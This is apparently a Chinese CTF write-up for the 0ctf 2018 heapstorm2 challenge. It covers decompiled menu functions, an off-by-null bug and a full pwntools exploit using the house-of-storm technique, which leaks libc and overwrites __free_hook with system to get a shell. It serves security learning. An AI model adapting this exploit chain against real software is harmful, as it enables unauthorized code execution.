<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">└─$ checksec <span class="hljs-number">0</span>ctf_2018_heapstorm2<br>[*] <span class="hljs-string">&#x27;/Desktop/0ctf_2018_heapstorm2&#x27;</span><br>    Arch:     amd64<span class="hljs-number">-64</span>-little<br>    RELRO:    Full RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      PIE enabled<br></code></pre></td></tr></table></figure>
<p>‘start’</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( !mallopt(<span class="hljs-number">1</span>, <span class="hljs-number">0</span>) )<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);        <span class="hljs-comment">//ban掉了fastbin</span><br>  <span class="hljs-keyword">if</span> ( mmap((<span class="hljs-type">void</span> *)<span class="hljs-number">0x13370000</span>, <span class="hljs-number">0x1000</span>uLL, <span class="hljs-number">3</span>, <span class="hljs-number">34</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">0LL</span>) != (<span class="hljs-type">void</span> *)<span class="hljs-number">322371584</span> )<span class="hljs-comment">//在0x13370000分配一段0x1000的内存</span><br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>  fd = open(<span class="hljs-string">&quot;/dev/urandom&quot;</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span> ( fd &lt; <span class="hljs-number">0</span> )<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>  <span class="hljs-keyword">if</span> ( read(fd, (<span class="hljs-type">void</span> *)<span class="hljs-number">0x13370800</span>, <span class="hljs-number">0x18</span>uLL) != <span class="hljs-number">24</span> )<span class="hljs-comment">//向0x13370800读入24字节的随机数</span><br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>  close(fd);<br>  MEMORY[<span class="hljs-number">0x13370818</span>] = MEMORY[<span class="hljs-number">0x13370810</span>];<br></code></pre></td></tr></table></figure>
<p>读入了3个随机数，第4个和第3个一样，我们记作r1,r2,r3,r4<br>初始化后面的地址，用r1异或0 作为ptr的值，r2异或0作为size值，我们之后的ptr都是通过xor r1得到的，size都是 xor r2得到的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; x /<span class="hljs-number">40</span>gx <span class="hljs-number">0x13370800</span><br><span class="hljs-number">0x13370800</span>:    <span class="hljs-number">0x72cec7f9b44fb49e</span>  <span class="hljs-number">0x438137bc554b405e</span><br><span class="hljs-number">0x13370810</span>:    <span class="hljs-number">0x7a4f542a3248dba2</span>  <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x13370820</span>:    <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x13370830</span>:    <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x13370840</span>:    <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x13370850</span>:    <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></table></figure>

<p>1.Allocate<br>注意xor</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __fastcall <span class="hljs-title function_">sub_DE6</span><span class="hljs-params">(_QWORD *a1)</span><br>&#123;<br>  __int64 v1; <span class="hljs-comment">// rsi</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+10h] [rbp-10h]</span><br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [rsp+14h] [rbp-Ch]</span><br>  <span class="hljs-type">void</span> *v4; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">15</span>; ++i )<br>  &#123;<br>    v1 = a1[<span class="hljs-number">2</span> * i + <span class="hljs-number">5</span>];<br>    <span class="hljs-keyword">if</span> ( !sub_BCC(a1, v1) )<br>    &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Size: &quot;</span>);<br>      v3 = sub_1551(<span class="hljs-string">&quot;Size: &quot;</span>, v1);<br>      <span class="hljs-keyword">if</span> ( v3 &gt; <span class="hljs-number">12</span> &amp;&amp; v3 &lt;= <span class="hljs-number">4096</span> )<br>      &#123;<br>        v4 = <span class="hljs-built_in">calloc</span>(v3, <span class="hljs-number">1uLL</span>);<br>        <span class="hljs-keyword">if</span> ( !v4 )<br>          <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        a1[<span class="hljs-number">2</span> * i + <span class="hljs-number">5</span>] = sub_BCC(a1, v3); <span class="hljs-comment">//a1[i+2].m_size = a1[0].m_size ^ input_size</span><br>        a1[<span class="hljs-number">2</span> * i + <span class="hljs-number">4</span>] = sub_BB0(a1, (__int64)v4);<span class="hljs-comment">//a1[i+2].m_heap = a1[0].m_heap ^ heap_addr</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Chunk %d Allocated\n&quot;</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)i);<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Invalid Size&quot;</span>);<br>      &#125;<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>2.Update</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">sub_F21</span><span class="hljs-params">(_QWORD *a1, __int64 a2)</span><br>&#123;<br>  __int64 v2; <span class="hljs-comment">// rsi</span><br>  <span class="hljs-type">signed</span> <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [rsp+10h] [rbp-20h]</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [rsp+14h] [rbp-1Ch]</span><br>  __int64 v6; <span class="hljs-comment">// [rsp+18h] [rbp-18h]</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Index: &quot;</span>);<br>  v4 = sub_1551(<span class="hljs-string">&quot;Index: &quot;</span>, a2);<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v4 &gt; <span class="hljs-number">0xF</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Invalid Index&quot;</span>);<br>  v2 = a1[<span class="hljs-number">2</span> * v4 + <span class="hljs-number">5</span>];<br>  <span class="hljs-keyword">if</span> ( !sub_BCC(a1, v2) )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Invalid Index&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Size: &quot;</span>);<br>  v5 = sub_1551(<span class="hljs-string">&quot;Size: &quot;</span>, v2);<br>  <span class="hljs-keyword">if</span> ( v5 &lt;= <span class="hljs-number">0</span> || v5 &gt; (<span class="hljs-type">unsigned</span> __int64)(sub_BCC(a1, a1[<span class="hljs-number">2</span> * v4 + <span class="hljs-number">5</span>]) - <span class="hljs-number">12</span>) )<span class="hljs-comment">// 0&lt;v5&lt;=size -12</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Invalid Size&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Content: &quot;</span>);<br>  v6 = sub_BB0(a1, a1[<span class="hljs-number">2</span> * v4 + <span class="hljs-number">4</span>]);<br>  sub_1377(v6, v5);<span class="hljs-comment">//off-by-null</span><br>  <span class="hljs-built_in">strcpy</span>((<span class="hljs-type">char</span> *)(v5 + v6), <span class="hljs-string">&quot;HEAPSTORM_II&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Chunk %d Updated\n&quot;</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v4);<br>&#125;<br></code></pre></td></tr></table></figure>
<p>3.Delete</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">sub_109B</span><span class="hljs-params">(_QWORD *a1, __int64 a2)</span><br>&#123;<br>  <span class="hljs-type">void</span> *v3; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">signed</span> <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [rsp+1Ch] [rbp-4h]</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Index: &quot;</span>);<br>  v4 = sub_1551(<span class="hljs-string">&quot;Index: &quot;</span>, a2);<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v4 &gt; <span class="hljs-number">0xF</span> || !sub_BCC(a1, a1[<span class="hljs-number">2</span> * v4 + <span class="hljs-number">5</span>]) )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Invalid Index&quot;</span>);<br>  v3 = (<span class="hljs-type">void</span> *)sub_BB0(a1, a1[<span class="hljs-number">2</span> * v4 + <span class="hljs-number">4</span>]);<br>  <span class="hljs-built_in">free</span>(v3);<br>  a1[<span class="hljs-number">2</span> * v4 + <span class="hljs-number">4</span>] = sub_BB0(a1, <span class="hljs-number">0LL</span>);<span class="hljs-comment">//ptr</span><br>  a1[<span class="hljs-number">2</span> * v4 + <span class="hljs-number">5</span>] = sub_BCC(a1, <span class="hljs-number">0LL</span>);<span class="hljs-comment">//size这俩都只是被xor了，没清零</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Chunk %d Deleted\n&quot;</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v4);<br>&#125;<br></code></pre></td></tr></table></figure>
<p>4.View</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">sub_11B5</span><span class="hljs-params">(_QWORD *a1, __int64 a2)</span><br>&#123;<br>  __int64 v3; <span class="hljs-comment">// rbx</span><br>  __int64 v4; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">signed</span> <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [rsp+1Ch] [rbp-14h]</span><br><br>  <span class="hljs-keyword">if</span> ( (a1[<span class="hljs-number">3</span>] ^ a1[<span class="hljs-number">2</span>]) != <span class="hljs-number">322401073LL</span> )<span class="hljs-comment">//要满足r2 xor r3 = 0x13377331才可以view</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Permission denied&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Index: &quot;</span>);<br>  v5 = sub_1551(<span class="hljs-string">&quot;Index: &quot;</span>, a2);<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v5 &gt; <span class="hljs-number">0xF</span> || !sub_BCC(a1, a1[<span class="hljs-number">2</span> * v5 + <span class="hljs-number">5</span>]) )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Invalid Index&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Chunk[%d]: &quot;</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v5);<br>  v3 = sub_BCC(a1, a1[<span class="hljs-number">2</span> * v5 + <span class="hljs-number">5</span>]);<br>  v4 = sub_BB0(a1, a1[<span class="hljs-number">2</span> * v5 + <span class="hljs-number">4</span>]);<br>  sub_14D4(v4, v3);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(byte_180A);<br>&#125;<br></code></pre></td></tr></table></figure>
<p>回顾一下house of storm的条件<br>glibc版本小于2.30<br><em>This requires the following:</em><br><strong>Write on free unsorted bin chunk</strong><br><strong>Write on free large bin chunk</strong><br><strong>Known address of target memory address</strong><br><strong>Known address of upper bits of heap chunk</strong></p>
<p>程序可能crash<br>多跑几次</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> p32,p64,u32,u64<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25201</span>)<br><span class="hljs-comment">#p = process(&#x27;./0ctf_2018_heapstorm2&#x27;)</span><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Command: &#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Command: &#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>    p.recvuntil(<span class="hljs-string">b&#x27;Content: &#x27;</span>)<br>    p.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    p.recvuntil(<span class="hljs-string">&#x27;Command: &#x27;</span>)<br>    p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>    p.sendline(<span class="hljs-string">&#x27;%d&#x27;</span> % idx)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Command: &#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-comment">#---------------堆风水，启动！-------------------------#</span><br>add(<span class="hljs-number">0x18</span>)<span class="hljs-comment">#chunk0	  off_by_null修改1的size</span><br>add(<span class="hljs-number">0x508</span>)<span class="hljs-comment">#chunk1</span><br>add(<span class="hljs-number">0x18</span>)<span class="hljs-comment">#chunk2</span><br><span class="hljs-comment">#---------------</span><br>add(<span class="hljs-number">0x18</span>)<span class="hljs-comment">#chunk3   off_by_null修改4的size</span><br>add(<span class="hljs-number">0x508</span>)<span class="hljs-comment">#chunk4</span><br>add(<span class="hljs-number">0x18</span>)<span class="hljs-comment">#chunk5   </span><br><span class="hljs-comment">#---------------</span><br>add(<span class="hljs-number">0x18</span>)<span class="hljs-comment">#chunk6   防止合并到top_chunk</span><br><br><span class="hljs-comment">#----------------unsorted chunk-----------------------#</span><br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x4F0</span> + p64(<span class="hljs-number">0x500</span>)) <span class="hljs-comment">#fake_chunk</span><br>delete(<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>*(<span class="hljs-number">0x18</span>-<span class="hljs-number">12</span>)) <span class="hljs-comment">#修改chunk1的size， 0x511-&gt;0x500</span><br>add(<span class="hljs-number">0x18</span>) <span class="hljs-comment">#chunk1 </span><br>add(<span class="hljs-number">0x4d8</span>) <span class="hljs-comment">#chunk7    把0x500用完</span><br><br>delete(<span class="hljs-number">1</span>)   <br>delete(<span class="hljs-number">2</span>) <span class="hljs-comment">#chunk1-chunk2 合并   这是就存在堆重叠</span><br><br>add(<span class="hljs-number">0x38</span>)<span class="hljs-comment">#chunk1</span><br>add(<span class="hljs-number">0x4e8</span>)<span class="hljs-comment">#chunk2   chunk7的content指向chunk2的chunk-0x10位置处,我们可以实现控制unsorted chunk</span><br><br><span class="hljs-comment">#-------------------large chunk-----------------------------------#</span><br>edit(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x4F0</span>+p64(<span class="hljs-number">0x500</span>))<span class="hljs-comment">#fake_chunk</span><br>delete(<span class="hljs-number">4</span>)<br>edit(<span class="hljs-number">3</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>*(<span class="hljs-number">0x18</span>-<span class="hljs-number">12</span>)) <span class="hljs-comment">#修改chunk4的size， 0x511-&gt;0x500</span><br>add(<span class="hljs-number">0x18</span>) <span class="hljs-comment">#chunk4</span><br>add(<span class="hljs-number">0x4d8</span>) <span class="hljs-comment">#chunk8   把0x500用完</span><br><br>delete(<span class="hljs-number">4</span>)<br>delete(<span class="hljs-number">5</span>) <span class="hljs-comment">#chunk4-chunk5 合并 这是就存在堆重叠</span><br><br>add(<span class="hljs-number">0x48</span>)<span class="hljs-comment">#chunk4  此时unsorted bin中剩下一个0x4e1大小的chunk，且与chunk8重叠，我们可以实现控制large chunk</span><br><span class="hljs-comment">#---------------unsorted chunk 和 large chunk ----------------------#</span><br>delete(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x4e8</span>) <span class="hljs-comment">#把0x4e1的chunk放入到largebin中</span><br>delete(<span class="hljs-number">2</span>)  <span class="hljs-comment">#把0x4F1的chunk放入到unsorted bin中</span><br><span class="hljs-comment">#---------------storm approching------------------------------#</span><br>fake_chunk = <span class="hljs-number">0x13370800</span> - <span class="hljs-number">0x20</span><br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x10</span> <br>payload += p64(<span class="hljs-number">0</span>) <br>payload += p64(<span class="hljs-number">0x4f1</span>) <br>payload += p64(<span class="hljs-number">0</span>) <br>payload += p64(fake_chunk)<br>edit(<span class="hljs-number">7</span>, payload) <span class="hljs-comment">#修改unsorted chunk的bk</span><br><br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x20</span> <br>payload += p64(<span class="hljs-number">0</span>) <br>payload += p64(<span class="hljs-number">0x4e1</span>) <br>payload += p64(<span class="hljs-number">0</span>) <br>payload += p64(fake_chunk+<span class="hljs-number">8</span>) <br>payload += p64(<span class="hljs-number">0</span>) <br>payload += p64(fake_chunk-<span class="hljs-number">0x18</span>-<span class="hljs-number">5</span>)<br>edit(<span class="hljs-number">8</span>, payload) <span class="hljs-comment">#修改 large chunk 的 bk 和 bk_nextsize</span><br>add(<span class="hljs-number">0x48</span>)  <span class="hljs-comment">#chunk2  -&gt; 0x133707e0   成功将申请到了heaparray附近</span><br><span class="hljs-comment">#-----------------------泄漏 libc----------------------------------#</span><br><span class="hljs-comment">#由于bins中的chunk的fd,bk指向libc的地址，我们先要泄漏heap的地址</span><br><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">6</span> + p64(<span class="hljs-number">0x13370800</span>)<br>edit(<span class="hljs-number">2</span>, payload) <span class="hljs-comment">#修改了r0~r4为0，并且修改了chunk0的地址，此时的chunk0的size非常大，因为异或的是0</span><br><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> +p64(<span class="hljs-number">0x13377331</span>)  <span class="hljs-comment">#满足show的条件</span><br>payload += p64(<span class="hljs-number">0x13370800</span>) + p64(<span class="hljs-number">0x1000</span>) <span class="hljs-comment">#chunk0</span><br>payload += p64(fake_chunk+<span class="hljs-number">3</span>) + p64(<span class="hljs-number">8</span>)   <span class="hljs-comment">#chunk1</span><br>edit(<span class="hljs-number">0</span>, payload) <span class="hljs-comment">#满足show的条件</span><br><br>show(<span class="hljs-number">1</span>)  <span class="hljs-comment">#我们刚刚house of storm 写的地址泄漏出来</span><br>p.recvuntil(<span class="hljs-string">&quot;]: &quot;</span>)<br>heap = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>success(<span class="hljs-string">&quot;heap:%s&quot;</span>+<span class="hljs-built_in">hex</span>(heap))<br><br>payload  = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0x13377331</span>)<span class="hljs-comment">#满足show的条件</span><br>payload += p64(<span class="hljs-number">0x13370800</span>) + p64(<span class="hljs-number">0x1000</span>) <span class="hljs-comment">#chunk0</span><br>payload += p64(heap+<span class="hljs-number">0x10</span>) + p64(<span class="hljs-number">8</span>) <span class="hljs-comment">#chunk1</span><br>edit(<span class="hljs-number">0</span>, payload)<br><br>show(<span class="hljs-number">1</span>) <span class="hljs-comment">#泄漏libc地址</span><br>p.recvuntil(<span class="hljs-string">&quot;]: &quot;</span>)<br>malloc_hook = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) -<span class="hljs-number">0x58</span> - <span class="hljs-number">0x10</span><br>libc_base = malloc_hook - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>free_hook = libc_base+libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system = libc_base+ libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>success(<span class="hljs-string">&quot;free_hook:%s&quot;</span>+<span class="hljs-built_in">hex</span>(free_hook))<br><span class="hljs-comment">#--------------修改 free_hook -----------------------------------#</span><br>payload  = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span><br>payload += p64(free_hook) + p64(<span class="hljs-number">0x100</span>)<span class="hljs-comment">#chunk0</span><br>payload += p64(<span class="hljs-number">0x13370800</span>+<span class="hljs-number">0x40</span>) + p64(<span class="hljs-number">8</span>)<span class="hljs-comment">#chunk1</span><br>payload += <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span><br>edit(<span class="hljs-number">0</span>, payload)<br>edit(<span class="hljs-number">0</span>, p64(system))<br>delete(<span class="hljs-number">1</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>


<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs power">I am the storm that is approaching<br>我即是那迫近的风暴<br>Provoking black clouds in isolation<br>唤醒樊笼中的乌云<br>I am reclaimer of my name<br>我要收回我的真名<br>Born in flames, I have been blessed<br>生于火焰 受尽祝福<br>My family crest is a demon of death!<br>死亡恶魔即是我的家徽<br>Forsakened, I am awakened<br>觉醒时已被遗弃<br>A phoenix&#x27;s ash in dark divine<br>凤凰的灰烬在黑暗神灵旁飘落<br>Descending misery<br>苦难降临<br>Destiny chasing time<br>命运追逐着时光<br></code></pre></td></tr></table></figure><div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/10/24/the-Belt-and-Road-review/">← Next the_Belt_and_Road_review</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/10/10/house-of-einherjar/">house_of_einherjar Prev →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a 